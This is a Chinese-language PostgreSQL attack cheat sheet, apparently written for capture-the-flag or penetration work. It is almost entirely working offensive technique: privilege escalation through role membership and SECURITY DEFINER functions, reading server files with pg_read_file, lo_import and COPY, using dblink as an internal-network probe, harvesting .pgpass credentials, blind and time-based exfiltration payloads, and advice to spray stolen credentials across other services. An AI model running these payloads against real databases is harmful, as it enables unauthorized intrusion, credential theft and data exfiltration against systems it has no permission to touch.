# PostgreSQL 攻击面手册(公开谱系,通用打法)

适用:暴露 5432,或应用层注入点后端是 PG。低权限连接 → 读文件 → 拿 flag 的公开阶梯。
来源=公开 PG 渗透方法论(HackTricks / PG 官方权限文档一类),与任何具体靶标无关。

## 0. 立足测绘(拿到任意 SQL 执行后的第一组查询,一次批量发完)

```sql
SELECT current_user, session_user, version();
SELECT rolname, rolsuper, rolcreaterole, rolcreatedb, rolreplication FROM pg_roles;
-- 角色成员关系(SET ROLE 的依据,最便宜的提权先查这个)
SELECT r.rolname AS member, g.rolname AS granted FROM pg_auth_members m
  JOIN pg_roles r ON r.oid=m.member JOIN pg_roles g ON g.oid=m.roleid;
-- 库内对象权限形状
SELECT table_name, privilege_type FROM information_schema.role_table_grants WHERE grantee=current_user;
SELECT has_database_privilege(current_user, current_database(), 'CREATE');
```

## 1. 提权阶梯(按成本从低到高)

1. **SET ROLE 直提**:成员关系里出现更高权限角色 → `SET ROLE <role>;` 立即换身份。比任何漏洞便宜,先查先试。
2. **SECURITY DEFINER 函数**(应用最常见配置错误:高权限 owner 的 DEFINER 函数暴露给低权限连接):
```sql
SELECT p.proname, n.nspname, r.rolname AS owner
FROM pg_proc p JOIN pg_roles r ON r.oid=p.proowner
  JOIN pg_namespace n ON n.oid=p.pronamespace
WHERE p.prosecdef AND r.rolname <> current_user;
```
   逐个 `SELECT pg_get_functiondef(p.oid) FROM pg_proc p WHERE p.proname='<name>';` 看定义,找参数滥用点:路径参数、动态 SQL 拼接、表名/列名插值。调用即以 owner 身份执行。
3. **默认/弱凭据横评**:应用连接串、备份 SQL、容器 env(`PGPASSWORD`)、`.pgpass`。

## 2. 文件读取阶梯(权限从宽到严逐档试)

- `SELECT pg_read_file('/绝对路径');` —— superuser 或 `pg_read_server_files` 角色。**已知形状:/proc、/sys 下的 0 长度文件返回空(不是权限错),别据此误判权限**。
- 大对象绕道:`SELECT lo_import('/路径');` → `SELECT lo_get(<返回的oid>);` —— 对部分 pg_read_file 拒绝的路径仍可用。
- `COPY <已建表> FROM '/路径';` 需建表权 + 服务端文件角色。
- **dblink 扩展**(能 `CREATE EXTENSION dblink` 或已装):同机回连可绕过部分函数级检查;连接串本身就是 SSRF/内网端口探针原语(`host=10.x.x.x port=xx connect_timeout=2`)。
- 只有布尔/报错通道时:文件内容用 `position('<guess>' in pg_read_file(...))` 逐字符外带,配合二分。

## 3. .pgpass 与凭据面

- `/root/.pgpass`、`~postgres/.pgpass` 存在 = 题设留的凭据通道,格式 `host:port:db:user:pass`,读出直连高权限账号。
- 数据库读不到家目录时转应用层:配置文件/LFI 类端点拿连接串,再回 PG。
- `pg_hba.conf` 常与 .pgpass 同目录,读它确认哪些账号允许哪些来源。

## 4. 外带通道速查

- 报错回显:`SELECT 1/(CASE WHEN <cond> THEN 0 ELSE 1 END);`
- 布尔差异:`SELECT CASE WHEN <cond> THEN 1 ELSE (SELECT 1 UNION SELECT 2) END;`(子查询多行=可观测)
- 时间:`SELECT pg_sleep(5) WHERE <cond>;`
- `string_to_array` 读 /proc 因 NUL 失败是已知形状,换 lo_import 或放弃 /proc。

## 5. 收手判据

非 superuser、pg_auth_members 无可 SET 的高角色、无 DEFINER 函数可滥用、无扩展权、文件读全拒 → SQL 面已到顶:转凭据瀑布(拿到的每个账号在全部服务上横评)、配置读取面、其他内网服务。在 SQL 面继续排队 = 烧预算。
